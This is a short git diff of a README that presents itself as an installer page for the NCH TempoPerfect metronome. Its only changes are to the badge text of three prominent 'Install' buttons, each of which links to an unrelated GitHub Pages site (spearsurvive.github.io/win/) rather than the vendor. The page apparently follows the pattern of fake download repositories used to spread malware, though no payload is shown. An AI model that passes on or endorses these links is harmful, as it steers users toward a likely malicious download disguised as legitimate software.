@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NCH TempoPerfect](https://img.shields.io/badge/⬇_Install_NCH%20TempoPerfect-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH TempoPerfect](https://img.shields.io/badge/⬇_Install_NCH+TempoPerfect-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NCH TempoPerfect is a digital metronome application for Windows and macOS that p
 
 <div align="center">
 
-[![⬇ Install NCH TempoPerfect](https://img.shields.io/badge/⬇_Install_NCH%20TempoPerfect-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH TempoPerfect](https://img.shields.io/badge/⬇_Install_NCH+TempoPerfect-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NCH TempoPerfect is a digital metronome application for Windows and macOS that p
 
 <div align="center">
 
-[![⬇ Install NCH TempoPerfect](https://img.shields.io/badge/⬇_Install_NCH%20TempoPerfect-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH TempoPerfect](https://img.shields.io/badge/⬇_Install_NCH+TempoPerfect-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
